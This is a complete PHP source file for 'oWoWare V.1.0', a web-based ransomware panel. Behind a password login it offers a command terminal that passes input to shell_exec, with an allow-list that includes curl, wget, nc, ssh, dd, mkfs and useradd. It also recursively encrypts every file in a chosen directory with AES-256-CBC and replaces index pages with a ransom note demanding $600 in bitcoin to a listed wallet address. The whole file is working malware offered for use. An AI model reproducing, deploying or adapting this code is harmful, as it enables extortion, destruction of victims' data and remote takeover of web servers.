<?php
session_start();

define('USERNAME', 'admin');
define('PASSWORD_HASH', '$2a$15$xEbegd2Cf26u2/2dw4LLXu0uJbqifWGFWXXh0gBkTDoImJOCJ5Ogu');

if (!isset($_SESSION['login_attempts'])) {
    $_SESSION['login_attempts'] = 0;
}
$max_attempts = 5;
$lockout_time = 15 * 60;

if (isset($_SESSION['locked_until']) && time() < $_SESSION['locked_until']) {
    $remaining = $_SESSION['locked_until'] - time();
    die("Too many failed attempts. Try again in " . ceil($remaining / 60) . " minutes.");
}

if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

if (isset($_POST['login'])) {
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        die("Invalid CSRF token.");
    }

    $username = trim($_POST['username']);
    $password = $_POST['password'];

    if ($username === USERNAME && password_verify($password, PASSWORD_HASH)) {
        session_regenerate_id(true);
        $_SESSION['authenticated'] = true;
        $_SESSION['login_attempts'] = 0;
        unset($_SESSION['locked_until']);
    } else {
        $_SESSION['login_attempts'] += 1;
        if ($_SESSION['login_attempts'] >= $max_attempts) {
            $_SESSION['locked_until'] = time() + $lockout_time;
            die("Too many failed attempts. Try again in 15 minutes.");
        }
        $error = "Invalid credentials. Remaining attempts: " . ($max_attempts - $_SESSION['login_attempts']);
    }
}

if (isset($_POST['logout'])) {
    session_unset();
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit();
}

if (isset($_POST['ajax']) && $_POST['ajax'] === '1' && isset($_POST['command'])) {
    if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
        echo json_encode(['status' => 'error', 'message' => 'Not authenticated.']);
        exit();
    }

    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        echo json_encode(['status' => 'error', 'message' => 'Invalid CSRF token.']);
        exit();
    }

    $command = trim($_POST['command']);
    $allowed_commands = [
        'ls', 'dir', 'cd', 'whoami', 'pwd', 'date', 'uptime', 'clear', 'cat', 'id', 'cp', 'mv', 'rm', 'touch', 'mkdir', 'rmdir', 
        'chmod', 'chown', 'chgrp', 'ln', 'ps', 'kill', 'top', 'htop', 'df', 'du', 'mount', 'umount', 'free', 'uname', 
        'ifconfig', 'ip', 'ping', 'netstat', 'ss', 'traceroute', 'wget', 'curl', 'scp', 'ssh', 'rsync', 'grep', 'egrep', 
        'fgrep', 'sed', 'awk', 'find', 'locate', 'xargs', 'tar', 'gzip', 'gunzip', 'bzip2', 'bunzip2', 'zip', 'unzip', 
        'nano', 'vim', 'emacs', 'less', 'more', 'head', 'tail', 'echo', 'printf', 'tee', 'diff', 'patch', 'sort', 'uniq', 
        'cut', 'paste', 'join', 'split', 'wc', 'expr', 'bc', 'dc', 'env', 'export', 'alias', 'unalias', 'history', 'which', 
        'whereis', 'man', 'whatis', 'apropos', 'su', 'sudo', 'useradd', 'userdel', 'usermod', 'groupadd', 'groupdel', 
        'passwd', 'crontab', 'at', 'jobs', 'bg', 'fg', 'nohup', 'screen', 'tmux', 'uptime', 'shutdown', 'reboot', 
        'systemctl', 'service', 'journalctl', 'dmesg', 'lsblk', 'blkid', 'fdisk', 'parted', 'mkfs', 'fsck', 'dd', 
        'df', 'du', 'lsof', 'strace', 'ldd', 'file', 'stat', 'uname', 'hostname', 'hostnamectl', 'ping', 'traceroute', 
        'nslookup', 'dig', 'ip', 'arp', 'route', 'iptables', 'firewalld', 'ufw', 'nc', 'telnet', 'ftp', 'nmap', 'tcpdump', 
        'iptables', 'lscpu', 'lsmod', 'modprobe', 'insmod', 'rmmod', 'dmidecode', 'hdparm', 'smartctl', 'lshw', 'lsusb', 
        'lspci', 'lsinitrd', 'mkinitrd', 'grub-install', 'grub-mkconfig', 'update-grub', 'adduser', 'deluser', 'visudo'
    ];
    $parts = explode(' ', $command);
    $base_command = strtolower($parts[0]);

    if (in_array($base_command, $allowed_commands)) {
        if ($base_command === 'clear') {
            echo json_encode(['status' => 'success', 'output' => 'clear']);
            exit();
        }

        if ($base_command === 'cat') {
            if (count($parts) !== 2 || preg_match('/[^a-zA-Z0-9_\-\.]/', $parts[1])) {
                echo json_encode(['status' => 'error', 'message' => 'Invalid arguments for cat.']);
                exit();
            }
        }

        $safe_command = escapeshellcmd($command);
        $output = shell_exec($safe_command . ' 2>&1');
        $log_entry = date('Y-m-d H:i:s') . " - User: " . USERNAME . " - Command: " . $command . "\n";
        if (!file_exists(__DIR__ . '/logs')) {
            mkdir(__DIR__ . '/logs', 0755, true);
        }
        file_put_contents(__DIR__ . '/logs/comandos.log', $log_entry, FILE_APPEND);
        echo json_encode(['status' => 'success', 'output' => $output]);
    } else {
        echo json_encode(['status' => 'error', 'message' => 'Command not allowed.']);
    }
    exit();
}

function encrypt_directory($target_dir, $key, &$processed_files, &$error_files) {
    if (!is_dir($target_dir)) {
        $error_files[] = $target_dir . " is not a directory.";
        return;
    }

    // Create index file in the main directory
    create_index_file($target_dir, $error_files);

    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($target_dir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );

    foreach ($iterator as $item) {
        $filename = $item->getFilename();
        if ($item->isFile()) {
            if (in_array(strtolower($filename), ['index.html', 'index.php'])) {
                continue;
            }

            $file_path = $item->getPathname();
            $relative_path = substr($file_path, strlen($target_dir));
            $file_contents = @file_get_contents($file_path);
            if ($file_contents === false) {
                $error_files[] = $relative_path . " (Error reading)";
                continue;
            }

            $iv_length = openssl_cipher_iv_length('AES-256-CBC');
            $iv = openssl_random_pseudo_bytes($iv_length);
            if ($iv === false) {
                $error_files[] = $relative_path . " (Error generating IV)";
                continue;
            }

            $encrypted_contents = openssl_encrypt($file_contents, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
            if ($encrypted_contents === false) {
                $error_files[] = $relative_path . " (Error encrypting)";
                continue;
            }

            $final_content = $iv . $encrypted_contents;
            $result = @file_put_contents($file_path, $final_content);
            if ($result === false) {
                $error_files[] = $relative_path . " (Error writing)";
                continue;
            }

            $processed_files[] = $relative_path;
        }

        if ($item->isDir()) {
            $dir_path = $item->getPathname();
            create_index_file($dir_path, $error_files);
        }
    }
}

function decrypt_directory($target_dir, $key, &$processed_files, &$error_files) {
    if (!is_dir($target_dir)) {
        $error_files[] = $target_dir . " is not a directory.";
        return;
    }

    // Create index file in the main directory
    create_index_file($target_dir, $error_files);

    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($target_dir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );

    foreach ($iterator as $item) {
        $filename = $item->getFilename();
        if ($item->isFile()) {
            if (in_array(strtolower($filename), ['index.html', 'index.php'])) {
                continue;
            }

            $file_path = $item->getPathname();
            $relative_path = substr($file_path, strlen($target_dir));
            $file_contents = @file_get_contents($file_path);
            if ($file_contents === false) {
                $error_files[] = $relative_path . " (Error reading)";
                continue;
            }

            $iv_length = openssl_cipher_iv_length('AES-256-CBC');
            if (strlen($file_contents) < $iv_length) {
                $error_files[] = $relative_path . " (Content too short for IV)";
                continue;
            }
            $iv = substr($file_contents, 0, $iv_length);
            $encrypted_contents = substr($file_contents, $iv_length);

            $decrypted_contents = openssl_decrypt($encrypted_contents, 'AES-256-CBC', $key, OPENSSL_RAW_DATA, $iv);
            if ($decrypted_contents === false) {
                $error_files[] = $relative_path . " (Error decrypting)";
                continue;
            }

            $result = @file_put_contents($file_path, $decrypted_contents);
            if ($result === false) {
                $error_files[] = $relative_path . " (Error writing)";
                continue;
            }

            $processed_files[] = $relative_path;
        }

        if ($item->isDir()) {
            $dir_path = $item->getPathname();
            create_index_file($dir_path, $error_files);
        }
    }
}

function create_index_file($dir_path, &$error_files) {
    $index_file_html = $dir_path . DIRECTORY_SEPARATOR . 'index.html';
    $index_file_php = $dir_path . DIRECTORY_SEPARATOR . 'index.php';
    if (!file_exists($index_file_html) && !file_exists($index_file_php)) {
        $index_file = $index_file_php;
        $content = "
<pre><center><b>

         __      ____      __     
        / /     / __ \\     \\ \\    
       / / ___ | |  | | ___ \\ \\   
      > / / _ \\| |  | |/ _ \\ > \\  
     / ^ ( (_) )\\ \\/ /( (_) ) ^ \\ 
    /_/ \\_\\___(___||___)___/_/ \\_\\
                     oWoWare V.1.0

<h2>Ooops, your files have been encrypted!</h2>

Your files will be lost
Send $600 worth of bitcoin to this address:
bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf8ch7
</pre></center></b>
        ";
        if (@file_put_contents($index_file, $content) === false) {
            $error_files[] = "Failed to create index file in " . $dir_path;
        }
    } else {
        $index_file = file_exists($index_file_html) ? $index_file_html : $index_file_php;
        $content = "
<pre><center><b>

         __      ____      __     
        / /     / __ \\     \\ \\    
       / / ___ | |  | | ___ \\ \\   
      > / / _ \\| |  | |/ _ \\ > \\  
     / ^ ( (_) )\\ \\/ /( (_) ) ^ \\ 
    /_/ \\_\\___(___||___)___/_/ \\_\\
                     oWoWare V.1.0

<h2>Ooops, your files have been encrypted!</h2>

Your files will be lost
Send $600 worth of bitcoin to this address:
bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf8ch7
</pre></center></b>
        ";
        if (@file_put_contents($index_file, $content) === false) {
            $error_files[] = "Failed to update index file in " . $dir_path;
        }
    }
}

if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true && $_SERVER["REQUEST_METHOD"] == "POST" && !isset($_POST['ajax'])) {
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        die("Invalid CSRF token.");
    }

    if (isset($_POST['action']) && $_POST['action'] === 'encrypt' && isset($_POST['key']) && isset($_POST['target_dir'])) {
        $key = trim($_POST['key']);
        $target_dir_input = trim($_POST['target_dir']);

        if (empty($key) || empty($target_dir_input)) {
            $error_cifrado = "Encryption key and directory are required.";
        } else {
            if (strlen($key) < 32) {
                $error_cifrado = "The key must be at least 32 characters for AES-256.";
            } else {
                $target_dir = realpath($target_dir_input);
                if ($target_dir === false || !is_dir($target_dir)) {
                    $error_cifrado = "Invalid or non-existent directory path.";
                } else {
                    $processed_files = [];
                    $error_files = [];

                    encrypt_directory($target_dir, $key, $processed_files, $error_files);

                    if (!empty($processed_files)) {
                        $success_cifrado = "Files encrypted successfully:<ul>";
                        foreach ($processed_files as $pf) {
                            $success_cifrado .= "<li>" . htmlspecialchars($pf) . "</li>";
                        }
                        $success_cifrado .= "</ul>";
                    }

                    if (!empty($error_files)) {
                        $error_cifrado = "Errors processing some files:<ul>";
                        foreach ($error_files as $ef) {
                            $error_cifrado .= "<li>" . htmlspecialchars($ef) . "</li>";
                        }
                        $error_cifrado .= "</ul>";
                    }

                    if (empty($processed_files) && empty($error_files)) {
                        $info_cifrado = "No files found to encrypt.";
                    }
                }
            }
        }
    }

    if (isset($_POST['action']) && $_POST['action'] === 'decrypt' && isset($_POST['key']) && isset($_POST['target_dir'])) {
        $key = trim($_POST['key']);
        $target_dir_input = trim($_POST['target_dir']);

        if (empty($key) || empty($target_dir_input)) {
            $error_descifrado = "Decryption key and directory are required.";
        } else {
            if (strlen($key) < 32) {
                $error_descifrado = "The key must be at least 32 characters for AES-256.";
            } else {
                $target_dir = realpath($target_dir_input);
                if ($target_dir === false || !is_dir($target_dir)) {
                    $error_descifrado = "Invalid or non-existent directory path.";
                } else {
                    $processed_files = [];
                    $error_files = [];

                    decrypt_directory($target_dir, $key, $processed_files, $error_files);

                    if (!empty($processed_files)) {
                        $success_descifrado = "Files decrypted successfully:<ul>";
                        foreach ($processed_files as $pf) {
                            $success_descifrado .= "<li>" . htmlspecialchars($pf) . "</li>";
                        }
                        $success_descifrado .= "</ul>";
                    }

                    if (!empty($error_files)) {
                        $error_descifrado = "Errors processing some files:<ul>";
                        foreach ($error_files as $ef) {
                            $error_descifrado .= "<li>" . htmlspecialchars($ef) . "</li>";
                        }
                        $error_descifrado .= "</ul>";
                    }

                    if (empty($processed_files) && empty($error_files)) {
                        $info_descifrado = "No files found to decrypt.";
                    }
                }
            }
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>oWoWare</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Courier+Prime&display=swap" rel="stylesheet">
    <style>
        body { background-color: #282a36; font-family: Arial, sans-serif; color: #f8f8f2; }
        .terminal {
            background-color: #44475a;
            color: #f8f8f2;
            padding: 15px;
            border-radius: 5px;
            font-family: 'Courier New', Courier, monospace;
            height: 300px;
            overflow-y: auto;
        }
        .terminal-input {
            background: none;
            border: none;
            color: #f8f8f2;
            width: 100%;
            outline: none;
            font-family: 'Courier New', Courier, monospace;
        }
        .banner {
            font-family: 'Courier Prime', monospace;
            white-space: pre;
            text-align: center;
            margin-bottom: 20px;
            color: #bd93f9;
        }
        .function-buttons .btn {
            margin-right: 10px;
            margin-bottom: 10px;
        }
        .terminal-container {
            display: flex;
            flex-direction: row;
            gap: 20px;
            margin-top: 20px;
        }
        .terminal-window {
            flex: 1;
        }
        .alert {
            padding: 0.5rem 1rem;
            margin-bottom: 1rem;
            border-radius: 0.25rem;
            font-size: 0.9rem;
        }
        .alert-danger { background-color: #ff5555; color: #f8f8f2; }
        .alert-success { background-color: #16b518; color: #000; }
        .alert-info { background-color: #8be9fd; color: #f8f8f2; }
        button.btn-close { filter: invert(1); }
    </style>
</head>
<body>
    <div class="container mt-5">
        <?php if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true): ?>
            <div class="row justify-content-center">
                <div class="col-md-6">
                    <div class="banner">
<?php
echo "  
         __      ____      __     
        / /     / __ \\     \\ \\    
       / / ___ | |  | | ___ \\ \\   
      > / / _ \\| |  | |/ _ \\ > \\  
     / ^ ( (_) )\\ \\/ /( (_) ) ^ \\ 
    /_/ \\_\\___(___||___)___/_/ \\_\\
                     oWoWare V.1.0
";
?>
                    </div>
                    <?php if (isset($error)): ?>
                        <div class="alert alert-danger"><?php echo htmlspecialchars($error); ?></div>
                    <?php endif; ?>
                    <form method="post" action="">
                        <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                        <div class="mb-3">
                            <label for="username" class="form-label">Username:</label>
                            <input type="text" id="username" name="username" class="form-control" required>
                        </div>
                        <div class="mb-3">
                            <label for="password" class="form-label">Password:</label>
                            <input type="password" id="password" name="password" class="form-control" required>
                        </div>
                        <button type="submit" name="login" class="btn btn-primary">Login</button>
                    </form>
                </div>
            </div>
        <?php else: ?>
            <div class="banner">
<?php
echo "
         __      ____      __     
        / /     / __ \\     \\ \\    
       / / ___ | |  | | ___ \\ \\   
      > / / _ \\| |  | |/ _ \\ > \\  
     / ^ ( (_) )\\ \\/ /( (_) ) ^ \\ 
    /_/ \\_\\___(___||___)___/_/ \\_\\
                     oWoWare V.1.0
";
?>
            </div>
            <div class="row">
                <div class="col-md-6">
                    <h2 class="mb-4">File Encryption and Decryption</h2>
                    <?php if (isset($error_cifrado)): ?>
                        <div class="alert alert-danger"><?php echo $error_cifrado; ?></div>
                    <?php endif; ?>
                    <?php if (isset($success_cifrado)): ?>
                        <div class="alert alert-success"><?php echo $success_cifrado; ?></div>
                    <?php endif; ?>
                    <?php if (isset($info_cifrado)): ?>
                        <div class="alert alert-info"><?php echo $info_cifrado; ?></div>
                    <?php endif; ?>

                    <?php if (isset($error_descifrado)): ?>
                        <div class="alert alert-danger"><?php echo $error_descifrado; ?></div>
                    <?php endif; ?>
                    <?php if (isset($success_descifrado)): ?>
                        <div class="alert alert-success"><?php echo $success_descifrado; ?></div>
                    <?php endif; ?>
                    <?php if (isset($info_descifrado)): ?>
                        <div class="alert alert-info"><?php echo $info_descifrado; ?></div>
                    <?php endif; ?>

                    <div class="function-buttons mb-3">
                        <button class="btn btn-success" data-bs-toggle="modal" data-bs-target="#encryptModal">Encrypt Files</button>
                        <button class="btn btn-warning" data-bs-toggle="modal" data-bs-target="#decryptModal">Decrypt Files</button>
                    </div>

                    <div class="modal fade" id="encryptModal" tabindex="-1" aria-labelledby="encryptModalLabel" aria-hidden="true">
                      <div class="modal-dialog">
                        <div class="modal-content" style="background-color: #44475a; color: #f8f8f2;">
                          <div class="modal-header">
                            <h5 class="modal-title" id="encryptModalLabel">Encrypt Files</h5>
                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                          </div>
                          <div class="modal-body">
                            <form method="post" action="">
                                <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                                <input type="hidden" name="action" value="encrypt">
                                <div class="mb-3">
                                    <label for="key" class="form-label">Encryption Key (min 32 characters):</label>
                                    <input type="password" id="key" name="key" class="form-control" required minlength="32">
                                </div>
                                <div class="mb-3">
                                    <label for="target_dir" class="form-label">Directory:</label>
                                    <input type="text" id="target_dir" name="target_dir" class="form-control" required placeholder="/path/to/directory">
                                </div>
                                <button type="submit" class="btn btn-success">Encrypt Files</button>
                            </form>
                          </div>
                        </div>
                      </div>
                    </div>

                    <div class="modal fade" id="decryptModal" tabindex="-1" aria-labelledby="decryptModalLabel" aria-hidden="true">
                      <div class="modal-dialog">
                        <div class="modal-content" style="background-color: #44475a; color: #f8f8f2;">
                          <div class="modal-header">
                            <h5 class="modal-title" id="decryptModalLabel">Decrypt Files</h5>
                            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                          </div>
                          <div class="modal-body">
                            <form method="post" action="">
                                <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                                <input type="hidden" name="action" value="decrypt">
                                <div class="mb-3">
                                    <label for="key_decrypt" class="form-label">Decryption Key (min 32 characters):</label>
                                    <input type="password" id="key_decrypt" name="key" class="form-control" required minlength="32">
                                </div>
                                <div class="mb-3">
                                    <label for="target_dir_decrypt" class="form-label">Directory:</label>
                                    <input type="text" id="target_dir_decrypt" name="target_dir" class="form-control" required placeholder="/path/to/directory">
                                </div>
                                <button type="submit" class="btn btn-warning">Decrypt Files</button>
                            </form>
                          </div>
                        </div>
                      </div>
                    </div>

                    <form method="post" action="" class="mt-4">
                        <button type="submit" name="logout" class="btn btn-danger">Logout</button>
                    </form>
                </div>
                <div class="col-md-6">
                    <h2 class="mb-4">Terminal</h2>
                    <button class="btn btn-secondary mb-3" onclick="toggleTerminal()">Open Terminal</button>
                    <div id="terminal-container" class="d-none">
                        <div class="terminal mb-3">
                            <div id="terminal-output" class="terminal-output">
                                <?php
                                if (isset($output) && !empty($output)) {
                                    if ($output === 'clear') {
                                        echo '';
                                    } else {
                                        echo nl2br(htmlspecialchars($output));
                                    }
                                }
                                ?>
                            </div>
                            <form id="command-form">
                                <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($_SESSION['csrf_token']); ?>">
                                <input type="text" name="command" id="command" class="form-control terminal-input" placeholder="Enter command" autocomplete="off" required>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        <?php endif; ?>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        function toggleTerminal() {
            var terminal = document.getElementById('terminal-container');
            $(terminal).toggleClass('d-none');
            if (!$(terminal).hasClass('d-none')) {
                $('#command').focus();
            }
        }

        $(document).ready(function(){
            $('#command-form').on('submit', function(e){
                e.preventDefault();
                var command = $('#command').val();
                var csrf_token = $('input[name="csrf_token"]').val();

                if(command.trim() === ''){
                    alert('Please enter a command.');
                    return;
                }

                $.ajax({
                    url: '<?php echo $_SERVER['PHP_SELF']; ?>',
                    type: 'POST',
                    dataType: 'json',
                    data: {
                        ajax: '1',
                        command: command,
                        csrf_token: csrf_token
                    },
                    success: function(response){
                        if(response.status === 'success'){
                            if(command.trim() === 'clear'){
                                $('#terminal-output').html('');
                            } else {
                                $('#terminal-output').append('<div><strong>' + $('<div>').text(command).html() + '</strong><br>' + $('<div>').text(response.output).html() + '</div><hr>');
                            }
                            $('#command').val('');
                            var terminalDiv = $('.terminal');
                            terminalDiv.scrollTop(terminalDiv[0].scrollHeight);
                        } else {
                            $('#terminal-output').append('<div><strong>Error:</strong> ' + $('<div>').text(response.message).html() + '</div><hr>');
                            var terminalDiv = $('.terminal');
                            terminalDiv.scrollTop(terminalDiv[0].scrollHeight);
                        }
                    },
                    error: function(){
                        $('#terminal-output').append('<div><strong>Error:</strong> Failed to process the request.</div><hr>');
                        var terminalDiv = $('.terminal');
                        terminalDiv.scrollTop(terminalDiv[0].scrollHeight);
                    }
                });
            });
        });
    </script>
</body>
</html>
